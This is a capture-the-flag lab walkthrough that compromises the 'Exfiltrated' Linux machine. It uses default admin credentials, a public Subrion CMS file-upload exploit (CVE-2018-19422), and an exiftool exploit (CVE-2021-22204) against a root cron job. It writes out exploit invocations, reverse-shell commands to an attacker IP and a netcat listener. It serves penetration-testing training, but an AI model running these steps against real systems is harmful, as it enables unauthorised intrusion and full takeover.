---
title: Exfiltrated PGP walkthrough
description: Target - Exfiltrated, OS - Linux Difficulty - Intermediate
readTime: 15 min read
date: 12-26-2025
image: ../assets/images/exflrd/subrion-login.png
---

#### ***Enumeration***

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -n -p- -T4 --open -Pn -oN Exfiltrated-nmap 192.168.143.163

Nmap scan report for 192.168.143.163
Host is up (/1dragon/assets/images/exflrd/0.32s latency).
Not shown: 65410 closed tcp ports (/1dragon/assets/images/exflrd/reset), 123 filtered tcp ports (/1dragon/assets/images/exflrd/no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (/1dragon/assets/images/exflrd/Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (/1dragon/assets/images/exflrd/RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (/1dragon/assets/images/exflrd/ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (/1dragon/assets/images/exflrd/ED25519)
80/tcp open  http    Apache httpd 2.4.41 (/1dragon/assets/images/exflrd/Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Added the target dns exfiltrated.offsec to /etc/host file
Only 2 ports were open - 22 and 80
Browsed to port 80 and discovered a website named as **KICKSTART**

![Web](/1dragon/assets/images/exflrd/webpage-kickstart.png)

Found the login page and used default credentials 

![Web-login](/1dragon/assets/images/exflrd/login.png)

The default credentials  `admin:admin` worked and logged into the site as user **Administrator**.

![](/1dragon/assets/images/exflrd/Pasted%20image%2020251228175934.png)
Beside the profile picture hover over the settings gear icon and it showed link to Admin Dashboard.

The **/panel** has the Admin Panel login page. It is powered by **Subrion CMS v4.2.1** that could be a lead from here.

![cms](/1dragon/assets/images/exflrd/subrion-dashboard.png)

Since logged in as admin into the Kickstart site and clicking on Admin Dashboard icon link the Admin panel site didn't asked for a separate login. However the same default credentials discovered earlier worked in here as well.

![](/1dragon/assets/images/exflrd/subrion-login.png)

The version discovered was **Subrion CMS v4.2.1** and searched for existing exploit in Searchsploit.

![](/1dragon/assets/images/exflrd/Pasted%20image%2020251228180536.png)

In Searchsploit discovered multiple exploits for the version 4.2.1 but one particular exploit looked relatable  - Arbitraru File Upload. Mirrored the exploit.

It had a CVE ID **CVE-2018-19422 - SubrionCMS 4.2.1 - File Upload Bypass to RCE**

---
#### ***Initial Access***

First ran the exploit with the help  `-h` parameter to understand what are the required pieces to have a successful exploitation.

`python3 49876.py -h` 

![](/1dragon/assets/images/exflrd/Pasted%20image%2020251228181012.png)
The exploit needed the target url , user, password which were all found earlier that could be used here.

Ran the exploit with required parameters

`python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin`

The exploit using the given valid credentials derived the CSRF token and logged in successfully and uploaded a webshell with `.phar` extension  and established a Remote Code Execution.

The user running the site as www-data.
Since it was a web-shell tried to get a separate reverse shell and for that checked if the target as busbybox installed and it does had one.

![exp](/1dragon/assets/images/exflrd/Pasted%20image%2020251228180858.png)

Ran a netcat reverse shell with busybox and successfully captured another reverse-shell.

![](/1dragon/assets/images/exflrd/Pasted%20image%2020251228185739.png)

Had a listener at `rlwrap nc -lnvp 4444`

![revs](/1dragon/assets/images/exflrd/rev.png)

---
#### ***Privilege Escalation***

Having the shell as www-data tried to read the local.txt flag under `/home/coaran/local.txt` but permission denied for www-data. Further transferred linpeas.sh and pspy32s to target for internal enumeration.

Modified the permission for executables.

```
www-data@exfiltrated:/tmp$ chmod +x linpeas.sh pspy32s
chmod +x linpeas.sh pspy32s
www-data@exfiltrated:/tmp$ ls -ltr
ls -ltr
total 1996
-rwxr-xr-x 1 www-data www-data 1175648 Jan 25  2025 pspy32s
-rwxr-xr-x 1 www-data www-data  862777 Jan 25  2025 linpeas.sh
```

Linpeas and pspy both identified that a cronjob is running every minute as user root.
Had pspy32s  running for a while and it showed that the image-exif.sh runs every minute as user root. Another lead for escalating to root user.

![cron](/1dragon/assets/images/exflrd/Pasted%20image%2020251228184856.png)
Read the script in `/opt/image-exif.sh`

The image-exif.sh tool  is used to analyze and store metadata for image files. The script here takes input Images from the directory `/var/www/html/subrion/uploads`
which was the same directory used by the foothold exploit earlier to upload a webshell with `.pahr` extension.

![image_exif](/1dragon/assets/images/exflrd/Pasted%20image%2020251228193916.png)

Searched for information about image-exif and discovered an exploit.
[Image-Exif exploit](/1dragon/assets/images/exflrd/https://github.com/UNICORDev/exploit-CVE-2021-22204)

Ran the exploit help menu with -h parameter.

```
─$ python3 50911.py -h                                                                                       
UNICORD Exploit for CVE-2021-22204

Usage:
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (/1dragon/assets/images/exflrd/Optional)
  -h    Show this help menu.

```

After knowing the options form the help menu proceeded with -s parameter which is for reverse shell.

`python3 50911.py -s 192.168.45.191 4444`

![xp-prvsc](/1dragon/assets/images/exflrd/Pasted%20image%2020251228191837.png)
The exploit generated an image file with the selected option for reverse shell.

Read the file type for the generated image

```
file image.jpg 
image.jpg: JPEG image data, JFIF standard 1.01, resolution (/1dragon/assets/images/exflrd/DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2]
```

The generated image file looked legitimate.

Transferred the image file to the target under directory /var/www/html/subrion/uploads
 
![](/1dragon/assets/images/exflrd/Pasted%20image%2020251228193503.png)

Had a netcat listener. After a minute of the cron job execution captured the reverse shell as root successfully.
Captured the flags under /home/coaran/local.txt and /root/proof.txt

![root-shell](/1dragon/assets/images/exflrd/rev.png)

---
										Target compromised - |^| ^ ( |< 3 D